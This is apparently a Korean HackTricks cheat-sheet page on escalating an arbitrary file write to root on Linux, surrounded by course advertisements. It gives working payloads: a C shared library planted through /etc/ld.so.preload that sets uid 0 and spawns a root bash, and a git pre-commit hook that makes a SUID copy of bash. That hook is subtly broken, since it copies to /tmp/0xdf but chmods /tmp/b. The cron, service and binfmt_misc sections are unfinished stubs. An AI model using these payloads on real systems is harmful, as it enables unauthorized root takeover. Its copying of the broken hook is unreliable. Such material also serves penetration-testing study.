# 루트로의 임의 파일 쓰기

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}

### /etc/ld.so.preload

이 파일은 **`LD_PRELOAD`** 환경 변수와 유사하게 작동하지만 **SUID 이진 파일**에서도 작동합니다.\
만약 이 파일을 생성하거나 수정할 수 있다면, 각 실행된 이진 파일과 함께 로드될 **라이브러리 경로를 추가**할 수 있습니다.

예시: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git 훅

[**Git 훅**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)은 커밋이 생성될 때 또는 병합될 때와 같은 git 저장소의 다양한 이벤트에서 실행되는 **스크립트**입니다. 따라서 **특권 스크립트 또는 사용자**가 이러한 작업을 자주 수행하고 `.git` 폴더에 **쓸 수 있는 경우**, 이를 사용하여 **권한 상승**을 할 수 있습니다.

예를 들어, git 저장소의 **`.git/hooks`**에 스크립트를 생성하여 새로운 커밋이 생성될 때 항상 실행되도록 할 수 있습니다:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Cron & 시간 파일

할 일

### 서비스 및 소켓 파일

할 일

### binfmt\_misc

`/proc/sys/fs/binfmt_misc`에 위치한 파일은 어떤 이진 파일이 어떤 유형의 파일을 실행해야 하는지를 나타냅니다. 할 일: 일반 파일 유형이 열릴 때 역쉘을 실행하도록 악용하는 요구 사항을 확인하십시오.

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}
